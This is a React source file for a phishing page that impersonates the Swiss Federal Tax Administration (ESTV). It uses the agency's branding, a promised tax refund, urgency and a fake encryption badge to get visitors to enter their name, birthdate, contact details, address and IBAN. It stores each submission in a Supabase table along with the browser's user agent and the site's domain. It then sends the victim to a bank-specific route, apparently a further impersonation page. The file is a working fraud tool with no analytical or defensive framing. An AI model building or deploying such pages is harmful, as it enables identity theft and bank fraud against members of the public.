import { useCallback, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, ChevronsUpDown, Check, Lock, AlertTriangle } from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banks, bankRouteMap, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { EstvHeader, EstvFooter, ESTV_RED, ESTV_TEXT } from "@/components/EstvChrome";
import { usePageMeta } from "@/hooks/use-page-meta";
import flagAsset from "@/assets/swiss-flag.svg.asset.json";
import {
  Popover, PopoverContent, PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command, CommandEmpty, CommandGroup, CommandItem, CommandList,
} from "@/components/ui/command";

const fieldBase =
  "h-12 w-full rounded-lg border bg-white px-4 text-[14px] placeholder:text-gray-400 transition-all duration-150 focus:outline-none focus:ring-4";
const fieldOk = "border-gray-200 hover:border-gray-300 focus:border-[#DC0018] focus:ring-[#DC0018]/10";
const fieldErr = "border-red-500 focus:border-red-500 focus:ring-red-500/15 bg-red-50/30";
const labelClass = "mb-2 block text-[13px] font-medium text-gray-700";

const REQUIRED_MESSAGES: Record<string, string> = {
  firstName: "Bitte geben Sie Ihren Vornamen ein",
  lastName: "Bitte geben Sie Ihren Nachnamen ein",
  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
  phone: "Bitte geben Sie Ihre Telefonnummer ein",
  street: "Bitte geben Sie Ihre Strasse ein",
  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
  city: "Bitte geben Sie Ihren Ort ein",
};
const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);

const Estv = () => {
  const navigate = useNavigate();
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [iban, setIban] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [bankOpen, setBankOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const inputRef = useRef<HTMLInputElement>(null);

  usePageMeta("Datenaktualisierung · ESTV", flagAsset.url);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  useEffect(() => {
    if (bankOpen && inputRef.current) inputRef.current.focus();
  }, [bankOpen]);

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const hasError = (name: string) => !!touched[name] && !values[name]?.trim();
  const inputCls = (name: string) => `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
  const onBlur = (name: string) => () => setTouched((t) => ({ ...t, [name]: true }));
  const ErrMsg = ({ name }: { name: string }) =>
    hasError(name) ? (
      <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES[name]}</p>
    ) : null;

  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const allValid =
    firstName.trim() && lastName.trim() && email.trim() && birthdate.trim() &&
    phone.trim() && street.trim() && houseNumber.trim() && postalCode.trim() &&
    city.trim() && ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!allValid) {
      setTouched(REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}));
      return;
    }
    setSubmitting(true);
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "estv",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain: typeof window !== "undefined"
          ? window.location.hostname.replace(/^www\./, "").toLowerCase()
          : null,
      })
      .select("id")
      .single();

    if (error) {
      setSubmitting(false);
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    const route = bankRouteMap[selectedBank];
    if (route) {
      setShowLoading(true);
      setTimeout(() => navigate(`${route}?s=${sessionId}`), 2500);
    }
  }, [
    allValid, firstName, lastName, email, birthdate, phone, street, houseNumber,
    postalCode, city, iban, selectedBank, navigate,
  ]);

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ color: ESTV_TEXT, fontFamily: "'Inter', system-ui, sans-serif" }}>
      {showLoading && (
        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
      )}
      <EstvHeader />

      <main className="flex-1 py-10 md:py-14">
        {/* Breadcrumb */}
        <div className="max-w-[1280px] mx-auto px-6 mb-6 text-[13px] text-gray-600">
          <span>Startseite</span>
          <span className="mx-2">›</span>
          <span className="text-gray-900">Datenaktualisierung</span>
        </div>

        <div className="max-w-[860px] mx-auto px-6">
          {/* Headline */}
          <h1 className="text-[34px] md:text-[42px] font-semibold tracking-tight leading-[1.1] mb-4">
            Datenaktualisierung
          </h1>
          <p className="text-[16px] text-gray-700 leading-relaxed max-w-[680px] mb-8">
            Bitte aktualisieren Sie Ihre persönlichen Daten und Bankverbindung,
            damit die Bearbeitung Ihrer Steuerrückerstattung korrekt erfolgen kann.
          </p>

          {/* Hinweis */}
          <div className="rounded-xl border-l-[3px] p-4 mb-8 flex gap-3" style={{ borderColor: ESTV_RED, backgroundColor: "#FDF2F3" }}>
            <AlertTriangle className="w-5 h-5 mt-0.5 shrink-0" style={{ color: ESTV_RED }} />
            <div className="text-[14px] text-gray-800 leading-relaxed">
              <strong>Wichtig:</strong> Ohne aktuelle Adress-, Kontakt- und Kontodaten kann
              Ihre Rückerstattung nicht ausgezahlt werden. Die Aktualisierung dauert nur wenige Minuten.
            </div>
          </div>

          {/* Formular */}
          <div className="bg-white rounded-2xl border border-gray-100 shadow-[0_4px_24px_-12px_rgba(0,0,0,0.08)]">
            <div className="px-6 py-5 border-b border-gray-200 bg-[#FAFAFA]">
              <h2 className="text-[20px] font-semibold">Persönliche Daten aktualisieren</h2>
              <p className="text-[13px] text-gray-600 mt-1">
                Alle mit <span style={{ color: ESTV_RED }}>*</span> gekennzeichneten Felder sind verpflichtend.
              </p>
            </div>

            <div className="p-6 md:p-8 space-y-10">
              {/* Persönliche Daten */}
              <section>
                <h3 className="text-[15px] font-semibold mb-4 pb-2 border-b border-gray-200">Persönliche Daten</h3>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>Vorname <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                      <ErrMsg name="firstName" />
                    </div>
                    <div>
                      <label className={labelClass}>Nachname <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                      <ErrMsg name="lastName" />
                    </div>
                  </div>
                  <div className="md:max-w-[280px]">
                    <label className={labelClass}>Geburtsdatum <span style={{ color: ESTV_RED }}>*</span></label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={birthdate}
                      onChange={(e) => {
                        let raw = e.target.value;
                        if (raw.length < birthdate.length && birthdate.endsWith(".") && !raw.endsWith(".")) {
                          raw = raw.slice(0, -1);
                        }
                        setBirthdate(formatBirthdate(raw));
                      }}
                      onBlur={onBlur("birthdate")}
                      placeholder="TT.MM.JJJJ"
                      maxLength={10}
                      className={inputCls("birthdate")}
                    />
                    <ErrMsg name="birthdate" />
                  </div>
                </div>
              </section>

              {/* Adresse */}
              <section>
                <h3 className="text-[15px] font-semibold mb-4 pb-2 border-b border-gray-200">Adresse</h3>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-[1fr_160px] gap-4">
                    <div>
                      <label className={labelClass}>Strasse <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                      <ErrMsg name="street" />
                    </div>
                    <div>
                      <label className={labelClass}>Hausnummer <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                      <ErrMsg name="houseNumber" />
                    </div>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-[160px_1fr] gap-4">
                    <div>
                      <label className={labelClass}>Postleitzahl <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                      <ErrMsg name="postalCode" />
                    </div>
                    <div>
                      <label className={labelClass}>Ort <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                      <ErrMsg name="city" />
                    </div>
                  </div>
                </div>
              </section>

              {/* Kontakt */}
              <section>
                <h3 className="text-[15px] font-semibold mb-4 pb-2 border-b border-gray-200">Kontaktdaten</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>E-Mail <span style={{ color: ESTV_RED }}>*</span></label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                    <ErrMsg name="email" />
                  </div>
                  <div>
                    <label className={labelClass}>Telefonnummer <span style={{ color: ESTV_RED }}>*</span></label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                    <ErrMsg name="phone" />
                  </div>
                </div>
              </section>

              {/* Bankverbindung */}
              <section>
                <h3 className="text-[15px] font-semibold mb-4 pb-2 border-b border-gray-200">Bankverbindung</h3>
                <p className="text-[13px] text-gray-600 mb-4">
                  Zur sicheren Identitätsprüfung benötigen wir Ihre aktuelle IBAN.
                </p>
                <div className="space-y-4">
                  <div>
                    <label className={labelClass}>IBAN <span style={{ color: ESTV_RED }}>*</span></label>
                    <input
                      type="text"
                      value={iban}
                      onChange={(e) => setIban(formatIBAN(e.target.value))}
                      maxLength={29}
                      placeholder="CH00 0000 0000 0000 0000 0"
                      className={cn(fieldBase, fieldOk, "tracking-wider")}
                    />
                  </div>

                  {showBankPicker && (
                    <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                      <label className={labelClass}>Bank auswählen <span style={{ color: ESTV_RED }}>*</span></label>
                      <Popover
                        open={bankOpen}
                        onOpenChange={(open) => {
                          setBankOpen(open);
                          if (!open) setBankSearch("");
                        }}
                      >
                        <PopoverTrigger asChild>
                          <div
                            className="flex h-11 w-full cursor-pointer items-center border border-gray-400 bg-white px-3 focus-within:border-[#DC0018] focus-within:ring-2 focus-within:ring-[#DC0018]/15"
                            role="combobox"
                            aria-expanded={bankOpen}
                            onClick={() => setBankOpen(true)}
                          >
                            {selectedBankObj && !bankOpen && (
                              <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                            )}
                            <input
                              ref={inputRef}
                              type="text"
                              className={cn(
                                "h-full flex-1 bg-transparent text-sm outline-none",
                                selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400"
                              )}
                              placeholder={selectedBank || "Bank auswählen"}
                              value={bankSearch}
                              onClick={(e) => { e.stopPropagation(); if (!bankOpen) setBankOpen(true); }}
                              onChange={(e) => { setBankSearch(e.target.value); if (!bankOpen) setBankOpen(true); }}
                              onFocus={(e) => { e.stopPropagation(); if (!bankOpen) setBankOpen(true); }}
                            />
                            <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                          </div>
                        </PopoverTrigger>
                        <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                          <Command>
                            <CommandList className="max-h-[250px] overflow-y-auto">
                              <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                              <CommandGroup>
                                {banks
                                  .filter((bank) => bank.name.toLowerCase().includes(bankSearch.toLowerCase()))
                                  .map((bank) => (
                                    <CommandItem
                                      key={bank.name}
                                      value={bank.name}
                                      onSelect={() => {
                                        setSelectedBank(bank.name);
                                        setBankOpen(false);
                                        setBankSearch("");
                                      }}
                                    >
                                      <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                      <span className="flex-1">{bank.name}</span>
                                      {selectedBank === bank.name && (
                                        <Check className="h-4 w-4" style={{ color: ESTV_RED }} />
                                      )}
                                    </CommandItem>
                                  ))}
                              </CommandGroup>
                            </CommandList>
                          </Command>
                        </PopoverContent>
                      </Popover>
                    </div>
                  )}
                </div>
              </section>

              {/* Submit */}
              <div className="pt-4 flex flex-col items-start gap-3">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="inline-flex items-center gap-2 text-white font-semibold text-[14px] px-7 py-3 rounded-none transition-opacity hover:opacity-90 disabled:opacity-60"
                  style={{ backgroundColor: ESTV_RED }}
                >
                  <span>Daten aktualisieren</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
                <div className="flex items-center gap-2 text-[12px] text-gray-500">
                  <Lock className="w-3.5 h-3.5" />
                  <span>SSL-verschlüsselt · Eidgenössische Steuerverwaltung ESTV</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <EstvFooter />
    </div>
  );
};

export default Estv;
